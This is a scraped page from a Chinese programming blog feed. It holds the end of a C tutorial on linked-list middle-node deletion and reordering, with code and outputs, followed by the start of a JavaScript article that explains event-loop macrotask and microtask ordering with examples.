	<span class="hljs-keyword">return</span> head;
}

<span class="hljs-comment">//尾插法</span>
Node* <span class="hljs-title function_">get_tail</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L;
	<span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		p = p-&gt;next;
	}
	<span class="hljs-keyword">return</span> p;
}

Node* <span class="hljs-title function_">TailList</span><span class="hljs-params">(Node* L, ElemType e)</span>
{
	Node* tail = get_tail(L);
	Node* p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	p-&gt;data = e;
	tail-&gt;next = p;
	p-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> p;
}

<span class="hljs-comment">//删除中间节点</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">delMiddleNode</span><span class="hljs-params">(Node* head)</span>
{
	Node* fast = head-&gt;next;
	Node* slow = head;

	<span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span> &amp;&amp; fast-&gt;next!=<span class="hljs-literal">NULL</span>)
	{
		fast = fast-&gt;next-&gt;next;<span class="hljs-comment">//fast移动两步</span>
		slow = slow-&gt;next;<span class="hljs-comment">//slow移动一步</span>
	}
	Node* q = slow-&gt;next;<span class="hljs-comment">//q记录被删除的节点</span>
	slow-&gt;next = q-&gt;next;<span class="hljs-comment">//slow指向被删除的下一个节点</span>
	<span class="hljs-built_in">free</span>(q);
	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
}


<span class="hljs-comment">//遍历</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L-&gt;next;
	<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>)
	{		
		
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,p-&gt;data);
		p = p-&gt;next;
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
	Node* <span class="hljs-built_in">list</span> = initList();

	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">1</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">4</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">5</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">6</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">7</span>);
	PrintList(<span class="hljs-built_in">list</span>);

	delMiddleNode(<span class="hljs-built_in">list</span>);
	PrintList(<span class="hljs-built_in">list</span>);
}
</code></pre>
<p>运行结果：</p>
<blockquote>
<p>1 2 3 4 5 6 7</p>
<p>1 2 3 5 6 7</p>
</blockquote>
<h2 data-id="heading-6">练习---拆分、反转后半段再交替合并的重排序方法</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eff90dd879e243d490841f2b1ddc5553~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=3ycdiTJrTBqSCTXLV6TABCUIo%2FI%3D" alt="image-20251206161841292.png" loading="lazy"/></p>
<p>核心逻辑分为三步：</p>
<ol>
<li>快慢指针找链表中点，将链表拆分为前半段和后半段；</li>
<li>反转后半段链表；</li>
<li>将前半段和反转后的后半段交替合并。</li>
<li>追加剩余节点（将中间节点接入链表末尾）</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5f70d75300744bc869619c65d1ee633~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgNzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765619492&amp;x-signature=vn%2Fm59j1q2hpugTzsmeuy07WiwU%3D" alt="image-20251206163641477.png" loading="lazy"/>
关键算法：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">//链表重新排序</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">reOrderList</span><span class="hljs-params">(Node* head)</span>
{
	Node* fast = head-&gt;next;
	Node* slow = head;
	<span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		fast = fast-&gt;next-&gt;next;
		slow = slow-&gt;next;
	}

	Node* first = <span class="hljs-literal">NULL</span>;
	Node* second = slow-&gt;next;  <span class="hljs-comment">//记录中间节点</span>
	slow-&gt;next = <span class="hljs-literal">NULL</span>;          <span class="hljs-comment">//从中间将链表打断</span>
	Node* third = <span class="hljs-literal">NULL</span>;

	<span class="hljs-keyword">while</span> (second != <span class="hljs-literal">NULL</span>)
	{
		third = second-&gt;next;
		second-&gt;next = first;
		first = second;
		second = third;
	}

	Node* p1 = head-&gt;next; <span class="hljs-comment">// p1：前半段指针</span>
	Node* q1 = first;      <span class="hljs-comment">// q1：反转后后半段指针</span>
	Node* p2, *q2;         <span class="hljs-comment">// 临时变量，保存p1/q1的后继（避免合并时丢失）</span>

	<span class="hljs-keyword">while</span> (p1 != <span class="hljs-literal">NULL</span> &amp;&amp; q1 != <span class="hljs-literal">NULL</span>)  <span class="hljs-comment">// 只要两段都有节点，就交替合并</span>
	{
		p2 = p1-&gt;next;  <span class="hljs-comment">//保存p1的下一个节点</span>
		q2 = q1-&gt;next;  <span class="hljs-comment">//保存q1的下一个节点</span>

		p1-&gt;next = q1; <span class="hljs-comment">//交替合并</span>
		q1-&gt;next = p2;

		p1 = p2;       
		q1 = q2;
	}

	<span class="hljs-comment">//追加剩余节点，若后半段还有未处理的剩余节点(如链表个数为奇数时)</span>
	<span class="hljs-keyword">if</span> (q1 != <span class="hljs-literal">NULL</span>)
	{
		<span class="hljs-comment">// 找到当前链表的末尾节点</span>
		Node* tail = head;
		<span class="hljs-keyword">while</span> (tail-&gt;next != <span class="hljs-literal">NULL</span>)
		{
			tail = tail-&gt;next;
		}
		tail-&gt;next = q1;    <span class="hljs-comment">// 将剩余节点（4）接入末尾</span>
	}

}
</code></pre>
<p>完整代码：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElemType;

<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> {</span>
	ElemType data;
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>
}Node;

<span class="hljs-comment">//初始化</span>
Node* <span class="hljs-title function_">initList</span><span class="hljs-params">()</span>
{
	Node* head = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	head-&gt;data = <span class="hljs-number">0</span>;
	head-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> head;
}

<span class="hljs-comment">//尾插法</span>
Node* <span class="hljs-title function_">get_tail</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L;
	<span class="hljs-keyword">while</span> (p-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		p = p-&gt;next;
	}
	<span class="hljs-keyword">return</span> p;
}

Node* <span class="hljs-title function_">TailList</span><span class="hljs-params">(Node* L, ElemType e)</span>
{
	Node* tail = get_tail(L);
	Node* p = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));
	p-&gt;data = e;
	tail-&gt;next = p;
	p-&gt;next = <span class="hljs-literal">NULL</span>;
	<span class="hljs-keyword">return</span> p;
}

<span class="hljs-comment">//链表重新排序</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">reOrderList</span><span class="hljs-params">(Node* head)</span>
{
	Node* fast = head-&gt;next;
	Node* slow = head;
	<span class="hljs-keyword">while</span> (fast != <span class="hljs-literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="hljs-literal">NULL</span>)
	{
		fast = fast-&gt;next-&gt;next;
		slow = slow-&gt;next;
	}

	Node* first = <span class="hljs-literal">NULL</span>;
	Node* second = slow-&gt;next;  <span class="hljs-comment">//记录中间节点</span>
	slow-&gt;next = <span class="hljs-literal">NULL</span>;          <span class="hljs-comment">//从中间将链表打断</span>
	Node* third = <span class="hljs-literal">NULL</span>;

	<span class="hljs-keyword">while</span> (second != <span class="hljs-literal">NULL</span>)
	{
		third = second-&gt;next;
		second-&gt;next = first;
		first = second;
		second = third;
	}

	Node* p1 = head-&gt;next; <span class="hljs-comment">// p1：前半段指针</span>
	Node* q1 = first;      <span class="hljs-comment">// q1：反转后后半段指针</span>
	Node* p2, *q2;         <span class="hljs-comment">// 临时变量，保存p1/q1的后继（避免合并时丢失）</span>

	<span class="hljs-keyword">while</span> (p1 != <span class="hljs-literal">NULL</span> &amp;&amp; q1 != <span class="hljs-literal">NULL</span>)  <span class="hljs-comment">// 只要两段都有节点，就交替合并</span>
	{
		p2 = p1-&gt;next;  <span class="hljs-comment">//保存p1的下一个节点</span>
		q2 = q1-&gt;next;  <span class="hljs-comment">//保存q1的下一个节点</span>

		p1-&gt;next = q1; <span class="hljs-comment">//交替合并</span>
		q1-&gt;next = p2;

		p1 = p2;       
		q1 = q2;
	}

	<span class="hljs-comment">//追加剩余节点，若后半段还有未处理的剩余节点(如链表个数为奇数时)</span>
	<span class="hljs-keyword">if</span> (q1 != <span class="hljs-literal">NULL</span>)
	{
		<span class="hljs-comment">// 找到当前链表的末尾节点</span>
		Node* tail = head;
		<span class="hljs-keyword">while</span> (tail-&gt;next != <span class="hljs-literal">NULL</span>)
		{
			tail = tail-&gt;next;
		}
		tail-&gt;next = q1;    <span class="hljs-comment">// 将剩余节点（4）接入末尾</span>
	}

}


<span class="hljs-comment">//遍历</span>
<span class="hljs-type">void</span> <span class="hljs-title function_">PrintList</span><span class="hljs-params">(Node* L)</span>
{
	Node* p = L-&gt;next;
	<span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>)
	{		
		
		<span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d "</span>,p-&gt;data);
		p = p-&gt;next;
	}
	<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
}

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
	Node* <span class="hljs-built_in">list</span> = initList();

	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">1</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">2</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">3</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">4</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">5</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">6</span>);
	TailList(<span class="hljs-built_in">list</span>, <span class="hljs-number">7</span>);
	PrintList(<span class="hljs-built_in">list</span>);

	reOrderList(<span class="hljs-built_in">list</span>);
	PrintList(<span class="hljs-built_in">list</span>);
}
</code></pre>
<p>运行结果：</p>
<blockquote>
<p>1 2 3 4 5 6 7</p>
<p>1 7 2 6 3 5 4</p>
</blockquote>
<p>单链表有哪些局限？——不能回头</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Event Loop 教你高效 “划水”：JS 单线程的“摸鱼”指南]]></title>    <link>https://juejin.cn/post/7580263284337754153</link>    <guid>https://juejin.cn/post/7580263284337754153</guid>    <pubDate>2025-12-06T10:05:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580263284337754153" data-draft-id="7579886397075128320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Event Loop 教你高效 “划水”：JS 单线程的“摸鱼”指南"/> <meta itemprop="keywords" content="JavaScript,前端,面试"/> <meta itemprop="datePublished" content="2025-12-06T10:05:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风止何安啊"/> <meta itemprop="url" content="https://juejin.cn/user/2517239724512420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Event Loop 教你高效 “划水”：JS 单线程的“摸鱼”指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2517239724512420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风止何安啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T10:05:11.000Z" title="Sat Dec 06 2025 10:05:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>各位前端打工人，有没有过这种经历：明明写了 <code>setTimeout(() =&gt; console.log('摸鱼'))</code>，结果同步代码还没跑完，摸鱼计划就被打断？其实 JS 单线程就像一个只能专注干一件事的打工人，而 <strong>Event Loop</strong> 就是它的 “高效摸鱼手册”—— 既能按时完成核心工作，又能把耗时任务 “挂起摸鱼”，今天咱们就一起好好聊聊这份手册！</p>
<h3 data-id="heading-1">一、先搞懂：JS 打工人为啥不能 “硬卷”？（进程线程的底层逻辑）</h3>
<p>要想<strong>摸鱼</strong>，得先知道 <strong>“工作台”</strong> 的规矩：</p>
<ul>
<li>
<p><strong>进程</strong>：好比公司的独立部门 —— 比如浏览器开个新标签页，就是开了个新部门，每个部门都有自己的办公资源（电脑、文件）。</p>
</li>
<li>
<p><strong>线程</strong>：部门里真正干活的打工人 —— 浏览器部门里就有三个核心员工：</p>
<ol>
<li>渲染线程（负责画页面，比如给按钮上色、排版文字）；</li>
<li>JS 引擎线程（咱们的主角，负责跑代码）；</li>
<li>HTTP 请求线程（负责发接口，比如向服务器要数据）。</li>
</ol>
</li>
</ul>
<p>但这里有个 “办公室规定”：<strong>JS 引擎线程和渲染线程是 “互斥同事”</strong> ——JS 能修改 DOM（比如把按钮改成红色），要是它俩同时干活，页面就会出现 <strong>“排版错乱”</strong>（比如按钮画到一半被改成红色），所以必须 “你歇我干”。</p>
<p>更关键的是：<strong>JS 引擎线程是个 “独生子”</strong> （V8 引擎默认只开一个线程）。这就意味着：如果 JS 遇到一个耗时 10 秒的计算任务（比如统计 100 万条数据），它就会一直死磕这个任务，导致渲染线程没法干活，页面直接卡成 “PPT”—— 这就是 <strong>“硬卷”</strong> 的下场！</p>
<p>所以 JS 打工人的<code>生存法则</code>是：<strong>能摸鱼就不硬卷，耗时任务先 “挂起”，等核心工作做完再处理</strong>—— 这就是 “异步摸鱼” 的核心逻辑。</p>
<h3 data-id="heading-2">二、Event Loop：摸鱼任务的 “优先级排序”</h3>
<p>JS 里的 <strong>“摸鱼任务”（异步任务）</strong> 分两类，就像公司里的 <strong>“紧急任务”</strong> 和 <strong>“常规任务”</strong>，得按顺序处理，不能乱摸鱼：</p>
<ul>
<li><strong>微任务</strong>：紧急摸鱼任务（优先级高）—— 比如 <code>Promise.then()</code>、<code>async/await</code> 后续代码、<code>process.nextTick()</code>（Node 环境），相当于 “老板临时交代的小任务，必须在下班前做完”；</li>
<li><strong>宏任务</strong>：常规摸鱼任务（优先级低）—— 比如 <code>setTimeout</code>、<code>setInterval</code>、ajax 请求、I/O 操作、UI 渲染，相当于 “下周要交的报告，先放一放”；</li>
<li>还有个特殊角色：<strong>同步任务</strong>—— 核心工作（比如写代码、算结果），必须优先做完，相当于 “当天要交的核心 KPI”。</li>
</ul>
<p><code>Event Loop</code> 就是这套摸鱼规则的 “监督者”，它的工作流程就像打工人的一天，记好这 <strong><code>4</code> 步</strong>，摸鱼不翻车：</p>
<ol>
<li><strong>先清核心 KPI</strong>：先把当天的同步任务 <strong>（核心工作）</strong> 全部做完，遇到异步任务 <strong>（摸鱼任务）</strong>，就按类型扔进 “微任务队列” <strong>（紧急摸鱼）</strong> 和 “宏任务队列” <strong>（常规摸鱼）</strong>；</li>
<li><strong>再处理紧急摸鱼</strong>：核心 KPI 做完后，把 “微任务队列” 里的所有任务一次性清完（比如老板临时交代的 3 个小任务，必须连续做完，不能中途打断）；</li>
<li><strong>中场休息（渲染页面）</strong> ：紧急摸鱼任务处理完，浏览器会进行 “页面渲染”（比如更新 DOM、刷新页面），相当于打工人喝杯咖啡歇一歇；</li>
<li><strong>开启下一轮摸鱼</strong>：从 “宏任务队列” 里拿一个任务执行，然后重复 1-3 步，直到所有任务做完。</li>
</ol>
<h3 data-id="heading-3">三、实战摸鱼：用代码例子验证规则</h3>
<p>光说不练假把式，咱们用真实代码模拟 JS 打工人的 “摸鱼一天”，看看 Event Loop 是怎么安排任务的！</p>
<h4 data-id="heading-4">例子 1：<code>setTimeout</code>为啥 “跑不赢” 同步代码？</h4>
<p>先看这串经典代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> a = <span class="hljs-number">1</span>;
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    a = <span class="hljs-number">2</span>
}, <span class="hljs-number">1000</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(a);
</code></pre>
<p><strong>分析摸鱼过程</strong>：</p>
<ul>
<li>同步代码（属于宏任务）先跑：<code>let a=1</code> → 执行<code>console.log(a)</code>，此时<code>a</code>还是 1；</li>
<li><code>setTimeout</code>是宏任务，被扔进 “宏任务队列” 排队；</li>
<li>同步跑完后，微任务队列为空，直接执行下一个宏任务（也就是 1 秒后的<code>a=2</code>）。</li>
</ul>
<p>所以结果是：<strong>先输出 1，1 秒后<code>a</code>才变成 2</strong>。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/490315da9a41419ab15c2dd958b1f339~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765620311&amp;x-signature=NLypQLEEjwipgvFKtg7bLYNqeqo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-5">例子 2：<code>Promise.then</code>的 “VIP 特权”</h4>
<p>我们看一道经典面试题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span>);
<span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span>);
    <span class="hljs-title function_">resolve</span>();
})
.<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">4</span>);
    }, <span class="hljs-number">0</span>)
})
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">5</span>);
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">6</span>);
    }, <span class="hljs-number">0</span>)
}, <span class="hljs-number">0</span>)
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">7</span>);
</code></pre>
<p>是不是已经头皮发麻了？根本不清楚打印顺序是啥，但是这道面试题我们必须拿下！</p>
<p><strong>摸鱼步骤拆解</strong>：</p>
<ol>
<li>
<p><strong>常规摸鱼（宏任务）开跑</strong>：</p>
<ul>
<li>先执行<code>console.log(1)</code> → 输出<code>1</code>；</li>
<li>遇到<code>new Promise</code>：<strong>Promise 构造函数里的代码是同步的</strong>，执行<code>console.log(2)</code> → 输出<code>2</code>，然后<code>resolve()</code>；</li>
<li><code>then</code>是微任务，扔进 “微任务队列”；</li>
<li>遇到外层<code>setTimeout</code>：宏任务，扔进 “宏任务队列”；</li>
<li>最后执行<code>console.log(7)</code> → 输出<code>7</code>。</li>
</ul>
</li>
<li>
<p><strong>紧急摸鱼（微任务）接棒</strong>：</p>
<ul>
<li>微任务队列里只有<code>then</code>的回调，执行它：<code>console.log(3)</code> → 输出<code>3</code>；</li>
<li>回调里的<code>setTimeout(4)</code>是宏任务，扔进 “宏任务队列”。</li>
</ul>
</li>
<li>
<p><strong>宏任务队列开跑（下一轮摸鱼）</strong> ：</p>
<ul>
<li>先拿第一个宏任务（外层<code>setTimeout</code>）：执行<code>console.log(5)</code> → 输出<code>5</code>；</li>
<li>里面的<code>setTimeout(6)</code>扔进宏任务队列；</li>
<li>再拿下一个宏任务（<code>then</code>里的<code>setTimeout(4)</code>）：执行<code>console.log(4)</code> → 输出<code>4</code>；</li>
<li>最后拿<code>setTimeout(6)</code>：执行<code>console.log(6)</code> → 输出<code>6</code>。</li>
</ul>
</li>
</ol>
<p><strong>最终输出顺序</strong>：<code>1 → 2 → 7 → 3 → 5 → 4 → 6</code></p>
